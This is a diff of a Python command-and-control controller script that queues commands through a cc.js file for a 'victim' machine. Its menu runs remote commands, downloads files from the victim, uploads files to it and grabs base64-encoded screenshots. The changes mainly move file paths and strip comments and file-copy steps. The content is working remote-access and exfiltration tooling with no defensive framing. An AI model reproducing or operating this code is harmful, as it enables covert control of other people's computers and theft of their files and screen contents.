@@ -40,21 +40,16 @@ import os
 import subprocess
 import psutil
 import base64
-import shutil
 
 ######
 ## GLOBAL VARIABLES
 ######
 SLEEP=(5)
 pwd = os.getcwd()
-cc=(pwd + '/WebOnly/cc.js')
+cc=(pwd + '/ServerRequirements/cc.js')
 eguiHTTPS=(pwd + '/ServerRequirements/eguiHTTPS.py')
 server=(pwd + '/ServerRequirements/server.py')
 
-
-#######
-## Define Functions
-#######
 def bannerFunc():
     # BANNER COMPLETE
     f = open('BANNER.txt', 'r').read()
@@ -90,9 +85,6 @@ def mainLoopFunc():
         user_input = str(raw_input("[+] Type '1', '2', '3', '4', or 'q/Q'\n"))
         print(user_input)
 
-        ###################
-        ## 1 - COMMAND
-        ###################
         if user_input is '1':
             #print("COMMAND!")
             command_input = raw_input("[+] What command do you want to run?\n")
@@ -108,9 +100,6 @@ def mainLoopFunc():
             time.sleep(SLEEP)
             continue
 
-        ###################
-        ## 2 - DOWNLOAD FROM VICTIM
-        ###################
         elif user_input is '2':
             print("DOWNLOAD FROM VICTIM")
             command_input = raw_input("[+] What file do you want to Download from Victim?\n")
@@ -125,15 +114,11 @@ def mainLoopFunc():
             time.sleep(SLEEP)
             
             # Change name from FILENAME (created in eguiHTTPS.py) to real Filename
-            os.rename('./WebOnly/FILENAME', './Files/' + command_input)
+            os.rename('FILENAME', './Files/' + command_input)
             time.sleep(2)
             print("[!] " + command_input + " has been downloaded and saved to " + pwd + '/Files/' + command_input)
  
             continue
-
-        #####################
-        ## 3 - UPLOAD TO VICTIM
-        #####################
         elif user_input is '3':
             #print("UPLOAD TO VICTIM")
             command_input = raw_input("[+] What file do you want to Upload to Victim?\n")
@@ -143,14 +128,10 @@ def mainLoopFunc():
             f.write(command_input + '\n')
             f.close()
 
-            # Copy file you want to upload (located in ./Files/) to ./WebOnly/
-            shutil.copy('./Files/' + command_input, './WebOnly/')
-
             print("[*] Uploading file to Victim...")
             time.sleep(SLEEP)
             print("[*] Let's make sure it's there..")
 
-            # Validate it's there by running "dir <file>" on victim
             f = open (cc, 'w')
             f.write("1\n")
             f.write("dir " + command_input)
@@ -160,14 +141,7 @@ def mainLoopFunc():
             time.sleep(SLEEP)
             time.sleep(SLEEP)
 
-            # Remove the file we temporarily moved to ./WebOnly
-            os.remove('./WebOnly/' + command_input)
-    
             continue
-
-        #########################
-        ## 4 - SCREEN CAPTURE
-        #########################
         elif user_input is '4':
             #print("SCREENCAPTURE")
             # Blank out cc.js
@@ -194,14 +168,14 @@ def mainLoopFunc():
             
             time.sleep(SLEEP)
             # Read downloaded Screenshot1.bmp (which is base64 encoded) and decode it into a file with dateFile .. save it to Screenshots directory
-            f = open('./WebOnly/screenshot1.bmp', 'r').read()
+            f = open('screenshot1.bmp', 'r').read()
             decoded = base64.b64decode(f)
             g = open('./Screenshots/' + dateFile, 'w')
             g.write(decoded)
             g.close()
             
             # Remove screenshot uploaded.. since it is renamed in ./Screenshots/ directory
-            os.remove('./WebOnly/screenshot1.bmp')
+            os.remove('screenshot1.bmp')
             time.sleep(SLEEP)
 
             continue
